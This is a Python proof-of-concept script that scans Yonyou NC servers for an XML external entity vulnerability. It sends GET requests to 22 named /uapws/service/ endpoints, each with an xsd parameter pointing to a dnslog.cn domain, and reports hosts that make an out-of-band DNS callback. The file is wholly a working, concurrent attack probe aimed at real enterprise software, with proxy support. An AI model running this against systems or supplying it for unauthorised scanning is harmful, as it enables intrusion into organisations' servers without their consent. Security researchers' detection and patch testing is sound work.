'''
Function:
    yonyounc xxe漏洞
Author:
    spmonkey
Email：
    spmonkey@hscsec.cn
Blog:
    https://spmonkey.github.io/
GitHub:
    https://github.com/spmonkey/
'''
# -*- coding: utf-8 -*-
from gevent import monkey;monkey.patch_all()
from gevent.pool import Pool
from gevent.queue import Queue
import requests
import re
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.xxe_apis = ["nc.itf.ses.DataPowerService", "nc.itf.tb.outlineversion.TbbOutlineUpateVersionService", "transreport", "nc.itf.ses.inittool.PortalSESInitToolService", "nc.itf.bap.service.IBapIOService", "nc.itf.ses.inittool.SESInitToolService", "nc.uap.oba.update.IUpdateService", "IReqKmToRtDataSrv", "nc.pubitf.rbac.IUserPubServiceWS", "nc.itf.tb.oba.IOBAMasterNodeWebService", "nc.itf.tb.oba.INtbOBAWebService", "nc.itf.smart.ISmartQueryWebService", "nc.itf.bd.crm.IMeasdocExportToCrmService", "nc.itf.bd.crm.IAreaclExportToCrmService", "nc.itf.bd.crm.IInvclExportToCrmService", "nc.itf.bd.crm.ICorpExportToCrmService", "nc.itf.bd.crm.IInvbasdocExportToCrmService", "nc.itf.bd.crm.IUserExportToCrmService", "nc.itf.bd.crm.ICustomerImportToNcService", "nc.itf.bd.crm.ICurrtypeExportToCrmService", "nc.itf.bd.crm.ICustomerExportToCrmService", "nc.itf.bd.crm.IPsndocExportToCrmService"]
        self.headers = {
            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
        }
        self.q = Queue()
        self.text_list = []
        self.proxies = proxies

    def get_dnslog(self):
        url = "http://dnslog.cn/getdomain.php"
        headers = {
            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
        }
        result = requests.get(url=url, headers=headers, verify=False)
        cookie = re.search("(.*);", result.headers.get('Set-Cookie')).group(1)
        return result.text, cookie

    def get_result(self, cookie):
        url = "http://dnslog.cn/getrecords.php"
        headers = {
            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
            'Cookie': cookie
        }
        result = requests.get(url=url, headers=headers, verify=False)
        return result.text

    def vuln_path(self):
        for xxe_path in self.xxe_apis:
            self.q.put(xxe_path)
        return True

    def host(self):
        url = urlparse(self.url)
        netloc = url.netloc
        scheme = url.scheme
        return netloc, scheme

    def vuln(self, url):
        while True:
            result_text = ""
            if self.q.qsize() == 0:
                break
            api = self.q.get()
            dnslog_all = self.get_dnslog()
            dnslog = dnslog_all[0]
            target_url = url + "/uapws/service/" + api + "?xsd=http://" + dnslog + "/ext.dtd"
            try:
                result = requests.get(url=target_url, headers=self.headers, verify=False, proxies=self.proxies)
                for i in range(5):
                    dnslog_result = self.get_result(dnslog_all[1])
                if dnslog_result != "[]":
                    target = urlparse(target_url)
                    result_text += """\n        [+]    \033[32m检测到目标站点存在XML外部实体注入漏洞\033[0m
                 GET {} HTTP/1.1
                 Host: {}""".format(target.path + "?" + target.query, target.netloc)
                    for request_type, request_text in dict(result.request.headers).items():
                        result_text += "\n                 {}: {}".format(request_type, request_text)
                    self.text_list.append(result_text)
            except Exception as e:
                pass

    def main(self):
        all = self.host()
        netloc = all[0]
        scheme = all[1]
        pool = Pool(5)
        url = "{}://{}".format(scheme, netloc)
        if self.vuln_path():
            try:
                tasks = [pool.spawn(self.vuln, url) for i in range(10)]
                pool.join()
            except:
                pass
        return self.text_list


